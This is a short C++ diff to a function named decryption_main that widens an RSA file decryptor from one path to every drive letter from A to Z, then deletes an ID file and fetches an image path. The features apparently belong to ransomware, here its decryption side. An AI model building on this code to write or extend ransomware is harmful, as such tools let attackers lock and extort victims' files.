@@ -258,7 +258,17 @@ int decryption_main()
 		return -1;
 	}
 	rsaDecryptor.init_Decryptor(stringPrivateBlob);
-	iterate(path, rsaDecryptor);
+	for (char i = 'A';i <= 'Z';i++)
+	{
+		string pathToDriver;
+		pathToDriver += i;
+		pathToDriver += ':';
+		pathToDriver += '\\';
+		if (exists(pathToDriver))
+		{
+			iterate(pathToDriver, rsaDecryptor);
+		}
+	}
 
 	remove(pathToID);
 	string pathToImage = get_path_to_jpeg();
